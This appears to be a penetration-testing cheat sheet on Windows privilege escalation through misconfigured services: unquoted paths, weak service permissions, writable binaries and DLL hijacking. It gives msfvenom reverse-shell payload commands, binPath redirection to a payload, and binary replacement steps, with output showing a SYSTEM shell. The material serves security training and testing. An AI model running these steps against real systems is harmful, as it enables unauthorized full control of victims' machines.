# SERVICE MISCONFIGURATIONS

### List all services

See all services — Look for non-default services

```bash
sc queryex type=service state=all
Get-Service
wmic service list brief
```

<details>
<summary>Example Output</summary>

```
sc queryex type=service state=all | findstr /i 'SERVICE_NAME\|DISPLAY_NAME\|STATE'
SERVICE_NAME: CustomSvc
DISPLAY_NAME: Custom Application
STATE: 4 RUNNING
(Find non-default services to investigate)
```
</details>

---

### Unquoted service paths

Paths with spaces, no quotes — C:\Program Files\My App\svc.exe = hijack

```bash
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows"
```

<details>
<summary>Example Output</summary>

```
wmic service get name,pathname | findstr /v "C:\Windows"
CustomSvc  C:\Program Files\My App\service.exe

Path has spaces + no quotes = hijackable
Place: C:\Program Files\My.exe
Restart service -> runs your exe as SYSTEM
```
</details>

---

### Exploit unquoted path

Windows tries each space as path end — Restart service to trigger

```bash
If path: C:\Program Files\My App\service.exe
Place malicious exe at: C:\Program.exe
or: C:\Program Files\My.exe
```

<details>
<summary>Example Output</summary>

```
Path: C:\Program Files\My App\service.exe

msfvenom -p windows/x64/shell_reverse_tcp ... -f exe -o 'C:\Program Files\My.exe'

sc stop CustomSvc
sc start CustomSvc

Attacker:
C:\> whoami
nt authority\system
```
</details>

---

### Weak service permissions

Can you modify service config? — Change binPath to your payload

```bash
accesschk.exe -uwcqv * /accepteula
or: sc qc <service_name>
```

<details>
<summary>Example Output</summary>

```
accesschk.exe -uwcqv 'Everyone' * /accepteula
RW CustomService
  SERVICE_ALL_ACCESS

sc config CustomService binPath= 'C:\temp\rev.exe'
sc stop CustomService
sc start CustomService
(Shell as SYSTEM)
```
</details>

---

### Modify service binary path

Point service to your payload — Runs as service account (often SYSTEM)

```bash
sc config <service> binPath= 'C:\temp\rev.exe'
sc stop <service>
sc start <service>
```

<details>
<summary>Example Output</summary>

```
sc config CustomSvc binPath= 'C:\temp\rev.exe'
[SC] ChangeServiceConfig SUCCESS

sc stop CustomSvc
sc start CustomSvc

Attacker:
C:\> whoami
nt authority\system
```
</details>

---

### Writable service binary

Replace the actual binary — Overwrite with reverse shell

```bash
icacls 'C:\path\to\service.exe'
Look for: (F) or (M) for your user
```

<details>
<summary>Example Output</summary>

```
icacls C:\custom\svc.exe
BUILTIN\Users:(F)  <- FULL CONTROL!

copy C:\temp\rev.exe C:\custom\svc.exe /Y
sc stop CustomSvc
sc start CustomSvc
(Your payload runs as SYSTEM)
```
</details>

---

### DLL hijacking (services)

Service loads missing DLL — DLL runs as service user

```bash
Process Monitor: filter for NAME NOT FOUND on .dll
Place malicious DLL in search path
```

<details>
<summary>Example Output</summary>

```
Process Monitor filter: Result=NAME NOT FOUND, Path ends with .dll
CustomSvc.exe -> C:\custom\missing.dll NOT FOUND

msfvenom -p windows/x64/shell_reverse_tcp ... -f dll -o C:\custom\missing.dll
Restart service -> shell as SYSTEM
```
</details>

---

### Service restart permissions

Need to trigger the service — Some need admin to restart

```bash
sc stop <service>
sc start <service>
or reboot if you can
```

<details>
<summary>Example Output</summary>

```
sc stop CustomSvc
[SC] Access denied

Try: shutdown /r /t 0
OR wait for scheduled restart
OR: sc config CustomSvc start=auto
(Service restarts after reboot)
```
</details>

---
